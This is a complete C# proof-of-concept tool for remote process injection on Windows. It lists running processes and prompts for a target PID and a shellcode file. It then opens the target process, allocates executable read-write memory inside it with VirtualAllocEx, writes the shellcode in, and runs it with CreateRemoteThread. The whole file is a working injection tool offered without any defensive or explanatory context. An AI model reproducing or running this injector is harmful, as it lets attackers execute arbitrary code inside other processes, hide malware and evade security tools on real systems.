using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

static class Program
{
    static void Main()
    {
        Logger.Banner("Remote Process Injector - Proof of Concept");
        try
        {
            RunInjector();
        }
        catch (Exception ex)
        {
            Logger.Error($"Unexpected error: {ex.Message}");
        }
    }

    private static void RunInjector()
    {
        ProcessHelper.ListRunningProcesses();
        uint pid = ProcessHelper.GetPid();
        if (pid == 0) return;

        string shellcodePath = ShellcodeLoader.GetShellcodePath();
        if (string.IsNullOrEmpty(shellcodePath)) return;

        byte[] shellcode = ShellcodeLoader.LoadExternalFile(shellcodePath);
        if (shellcode == null) return;

        Injector.Inject(pid, shellcode);
    }
}

class Logger
{
    public static void Info(string msg) => Log("[*]", msg);
    public static void Error(string msg) => Log("[!]", msg);
    public static void Success(string msg) => Log("[+]", msg);
    public static void Win32Error(string msg)
    {
        int err = Marshal.GetLastWin32Error();
        Error($"{msg} Code: {err}");
    }

    public static void Banner(string title)
    {
        Console.WriteLine($"===[{title}]==");
    }

    private static void Log(string prefix, string msg)
    {
        Console.WriteLine($"{prefix} {msg}");
    }
}

static class ProcessHelper
{
    public static void ListRunningProcesses()
    {
        Logger.Info("List of active processes: ");
        foreach (var process in Process.GetProcesses())
        {
            try
            {
                Logger.Info($"Name: {process.ProcessName}, PID: {process.Id}");
            }
            catch (Exception ex)
            {
                Logger.Error($"Error listing processes: {ex.Message}");
            }
        }
    }

    public static uint GetPid()
    {
        Logger.Info("Enter the target process PID: ");
        if (!uint.TryParse(Console.ReadLine(), out uint pid))
        {
            Logger.Error("Invalid PID");
            return 0;
        }

        if (!ProcessHelper.ProcessExists(pid))
        {
            Logger.Error("Process not found.");
            return 0;
        }
        return pid;
    }

    public static bool ProcessExists(uint pid)
    {
        try
        {
            Process.GetProcessById((int)pid);
            return true;
        }
        catch
        {
            return false;
        }
    }
}

static class ShellcodeLoader
{
    public static string GetShellcodePath()
    {
        while (true)
        {
            Logger.Info("Enter the full path to the shellcode file:");
            string path = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(path))
            {
                Logger.Error("Path cannot be empty.");
                continue;
            }

            if (!File.Exists(path))
            {
                Logger.Error("File not found.");
                continue;
            }

            return path;
        }
    }

    public static byte[] LoadExternalFile(string filePath)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("Shellcode file not found.", filePath);

        byte[] shellcode = File.ReadAllBytes(filePath);

        if (shellcode.Length == 0)
            throw new InvalidDataException("Shellcode is empty.");

        Logger.Info($"Shellcode loaded successfully ({shellcode.Length} bytes)");
        return shellcode;
    }
}

static class Injector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, out int lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static void Inject(uint pid, byte[] shellcode)
    {
        Logger.Info($"Opening process with PID: {pid}....");
        IntPtr hProcess = OpenProcess((uint)(
                ProcessAccessFlags.PROCESS_CREATE_THREAD |
                ProcessAccessFlags.PROCESS_QUERY_INFORMATION |
                ProcessAccessFlags.PROCESS_VM_OPERATION |
                ProcessAccessFlags.PROCESS_VM_WRITE |
                ProcessAccessFlags.PROCESS_VM_READ),
                false, pid);

        if (hProcess == IntPtr.Zero)
        {
            Logger.Win32Error("Failed to open process.");
            return;
        }

        try
        {
            Logger.Info("Allocating virtual memory in remote process...");
            IntPtr remoteBuffer = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length,
                (uint)(AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE),
                (uint)MemoryProtection.PAGE_EXECUTE_READWRITE);

            if (remoteBuffer == IntPtr.Zero)
            {
                Logger.Win32Error("Failed to allocate virtual memory.");
                return;
            }

            Logger.Info("Writing shellcode to allocated virtual memory...");
            bool success = WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcode.Length, out int bytesWritten);

            if (!success || bytesWritten != shellcode.Length)
            {
                Logger.Win32Error("Failed to write to virtual memory");
                return;
            }

            Logger.Info($"Shellcode injected. {bytesWritten} bytes. Creating remote thread...");
            IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteBuffer, IntPtr.Zero, 0, out int threadId);

            if (remoteThread == IntPtr.Zero)
            {
                Logger.Win32Error("Failed to create remote thread.");
                return;
            }

            Logger.Info($"Remote thread created successfully. Thread ID {threadId}");
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }

    enum AllocationType : uint
    {
        MEM_COMMIT = 0x1000,
        MEM_RESERVE = 0x2000
    }

    enum MemoryProtection : uint
    {
        PAGE_EXECUTE_READWRITE = 0x40
    }

    enum ProcessAccessFlags : uint
    {
        PROCESS_CREATE_THREAD = 0x0002,
        PROCESS_QUERY_INFORMATION = 0x0400,
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_WRITE = 0x0020,
        PROCESS_VM_READ = 0x0010
    }
}
